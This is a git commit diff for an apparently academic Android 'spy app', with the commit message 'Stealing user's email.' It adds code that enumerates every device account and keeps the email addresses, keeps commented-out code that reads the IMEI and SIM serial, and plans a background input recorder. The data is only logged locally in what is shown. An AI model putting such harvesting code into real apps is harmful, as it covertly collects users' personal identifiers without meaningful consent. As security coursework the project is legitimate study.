7c89efa500c29bec759951fbd8e9e51201f999e0
Ciprian <ciliesj@gmail.com>
2019-11-05 16:43:25 -0800

    + Stealing user's email.

--- app/src/main/java/edu/csus/ecs/androidspyapp/MainActivity.java
+++ app/src/main/java/edu/csus/ecs/androidspyapp/MainActivity.java
@@ -1,7 +1,11 @@
 package edu.csus.ecs.androidspyapp;
 
 import android.Manifest;
+import android.accounts.Account;
+import android.accounts.AccountManager;
+import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.Build;
 import android.os.Bundle;
 import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
@@ -9,21 +13,35 @@ import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
 import android.util.Log;
+import android.util.Patterns;
 import android.view.View;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.telephony.TelephonyManager;
 import android.content.Context;
 import android.support.v4.content.ContextCompat;
+import android.widget.Toast;
 
-public class MainActivity extends AppCompatActivity {
+import com.google.android.gms.auth.GoogleAuthUtil;
+import com.google.android.gms.common.AccountPicker;
 
-    String[] permissions = {"android.permission.READ_PHONE_STATE"};
+import java.util.regex.Pattern;
 
-    private TelephonyManager telephonyManager;
+public class MainActivity extends AppCompatActivity
+{
+    private String TAG = "SPY";
+    String[] permissions = {"android.permission.GET_ACCOUNTS"};
+    private String wantAccountsPermission = Manifest.permission.GET_ACCOUNTS;
+
+    private String userEmail = "";
+
+    //private TelephonyManager telephonyManager;
+
+    private static final int PERMISSION_REQUEST_CODE = 1;
 
     @Override
-    protected void onCreate(Bundle savedInstanceState) {
+    protected void onCreate(Bundle savedInstanceState)
+    {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
@@ -38,11 +56,20 @@ public class MainActivity extends AppCompatActivity {
             }
         });
 
+        if (!checkPermission(wantAccountsPermission))
+        {
+            requestPermission(wantAccountsPermission);
+        }
+        else
+        {
+            getEmails();
+        }
+
         //TODO: Initial app data acquisition here..
-        telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        //telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
         //String phoneNumber = telephonyManager.getLine1Number();
 
-        Log.d("SPY", "testing logging from onCreate()");
+        Log.d(TAG, "testing logging from onCreate()");
 
         //Check for permission to steal the user's device information.
 //        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
@@ -64,40 +91,116 @@ public class MainActivity extends AppCompatActivity {
 //              getDeviceInfo();
 //        }
 
+        Intent googlePicker = AccountPicker
+                .newChooseAccountIntent(null, null, new String[]{GoogleAuthUtil.GOOGLE_ACCOUNT_TYPE},
+                        true, null, null, null, null);
+        startActivityForResult(googlePicker, PERMISSION_REQUEST_CODE);
+
         //TODO: Spawn background process that records all of your input and stuff.
     }
 
+    private void getEmails()
+    {
+        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
+
+        // Getting all registered Google Accounts;
+        // Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
+
+        // Getting all registered Accounts;
+        Account[] accounts = AccountManager.get(this).getAccounts();
+
+        for (Account account : accounts)
+        {
+            if (emailPattern.matcher(account.name).matches())
+            {
+                Log.d(TAG, String.format("%s - %s", account.name, account.type));
+                userEmail = account.name;
+            }
+        }
+    }
+
     @Override
-    public boolean onCreateOptionsMenu(Menu menu) {
+    public boolean onCreateOptionsMenu(Menu menu)
+    {
         // Inflate the menu; this adds items to the action bar if it is present.
         getMenuInflater().inflate(R.menu.menu_main, menu);
         return true;
     }
 
     @Override
-    public boolean onOptionsItemSelected(MenuItem item) {
+    public boolean onOptionsItemSelected(MenuItem item)
+    {
         // Handle action bar item clicks here. The action bar will
         // automatically handle clicks on the Home/Up button, so long
         // as you specify a parent activity in AndroidManifest.xml.
         int id = item.getItemId();
 
         //noinspection SimplifiableIfStatement
-        if (id == R.id.action_settings) {
+        if (id == R.id.action_settings)
+        {
             return true;
         }
 
         return super.onOptionsItemSelected(item);
     }
 
-    public void getDeviceInfo()
+//    public void getDeviceInfo()
+//    {
+//        //TODO:
+//        String IMEI = telephonyManager.getDeviceId();
+//        String subscriberID = telephonyManager.getDeviceId();
+//        String SIM_SN = telephonyManager.getSimSerialNumber();
+//        String networkCountryISO = telephonyManager.getNetworkCountryIso();
+//        String SIMCountryISO = telephonyManager.getSimCountryIso();
+//        String softwareVersion = telephonyManager.getDeviceSoftwareVersion();
+//        String voiceMailNumber = telephonyManager.getVoiceMailNumber();
+//    }
+
+    private boolean checkPermission(String permission)
     {
-        //TODO:
-        String IMEI = telephonyManager.getDeviceId();
-        String subscriberID = telephonyManager.getDeviceId();
-        String SIM_SN = telephonyManager.getSimSerialNumber();
-        String networkCountryISO = telephonyManager.getNetworkCountryIso();
-        String SIMCountryISO = telephonyManager.getSimCountryIso();
-        String softwareVersion = telephonyManager.getDeviceSoftwareVersion();
-        String voiceMailNumber = telephonyManager.getVoiceMailNumber();
+        if (Build.VERSION.SDK_INT >= 23) {
+            int result = ContextCompat.checkSelfPermission(this, permission);
+            if (result == PackageManager.PERMISSION_GRANTED)
+            {
+                return true;
+            }
+            else
+            {
+                return false;
+            }
+        }
+        else
+        {
+            return true;
+        }
+    }
+
+    private void requestPermission(String permission)
+    {
+        if (ActivityCompat.shouldShowRequestPermissionRationale(this, permission))
+        {
+            Toast.makeText(this, "Get account permission allows us to get your email",
+                    Toast.LENGTH_LONG).show();
+        }
+        ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults)
+    {
+        switch (requestCode)
+        {
+            case PERMISSION_REQUEST_CODE:
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
+                {
+                    getEmails();
+                }
+                else
+                {
+                    Toast.makeText(this, "Permission Denied.",
+                            Toast.LENGTH_LONG).show();
+                }
+                break;
+        }
     }
 }
